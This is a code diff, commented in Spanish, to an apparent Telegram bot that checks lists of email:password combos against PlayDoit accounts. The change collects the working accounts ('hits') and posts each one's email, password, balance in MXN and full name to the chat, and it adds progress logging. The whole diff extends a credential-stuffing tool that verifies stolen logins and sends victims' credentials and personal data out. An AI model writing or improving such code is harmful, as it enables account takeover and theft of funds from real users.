@@ -1106,6 +1106,7 @@ async def _run_check_playdoit_task(
     errors_count = 0
     total_balance_found = 0.0
     total = len(valid_combos)
+    hits_list: List[Any] = []
 
     status_msg = await bot.send_message(
         chat_id=chat_id,
@@ -1132,6 +1133,7 @@ async def _run_check_playdoit_task(
                     logger.error(f"[check_playdoit] Error guardando {email}: {ex_db}")
                 hits_count += 1
                 total_balance_found += result.balance_total
+                hits_list.append(result)
             elif result and result.account_dead:
                 try:
                     upsert_playdoit_account(result.to_dict(), checked_by=operator_id)
@@ -1152,14 +1154,33 @@ async def _run_check_playdoit_task(
                 except Exception:
                     pass
 
+            if idx % 25 == 0 or idx == total:
+                logger.info(
+                    f"[check_playdoit] Progreso: {idx}/{total} | Hits: {hits_count} | Dead: {dead_count} | Errors: {errors_count} | Saldo: ${total_balance_found:,.2f}"
+                )
+
+        hits_section = ""
+        if hits_list:
+            hits_lines = [
+                f"• <code>{h.email}:{h.password}</code> | ${h.balance_total:,.2f} | {h.fullname}"
+                for h in hits_list[:25]
+            ]
+            hits_section = "\n\n🎯 <b>HITS ENCONTRADOS:</b>\n" + "\n".join(hits_lines)
+            if len(hits_list) > 25:
+                hits_section += f"\n<i>...y {len(hits_list) - 25} hits más registrados en BD.</i>"
+
         final_text = (
             f"<b>✅ VERIFICACIÓN PLAYDOIT FINALIZADA</b>\n\n"
             f"• <b>Total Procesados:</b> {total}\n"
             f"• <b>Cuentas Vivas (HITS):</b> {hits_count}\n"
             f"• <b>Cuentas Muertas (DEAD):</b> {dead_count}\n"
             f"• <b>Errores de Red / Proxy:</b> {errors_count}\n"
-            f"• <b>Saldo Total Encontrado:</b> <b>${total_balance_found:,.2f} MXN</b>\n\n"
+            f"• <b>Saldo Total Encontrado:</b> <b>${total_balance_found:,.2f} MXN</b>"
+            f"{hits_section}\n\n"
             f"🌐 <i>Consulta detalles completos en el dashboard web ({DASHBOARD_URL}).</i>"
+        )
+        logger.info(
+            f"[check_playdoit] RESUMEN: {total} procesados | {hits_count} HITS (${total_balance_found:,.2f}) | {dead_count} DEAD | {errors_count} ERRORS"
         )
         await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
     except asyncio.CancelledError:
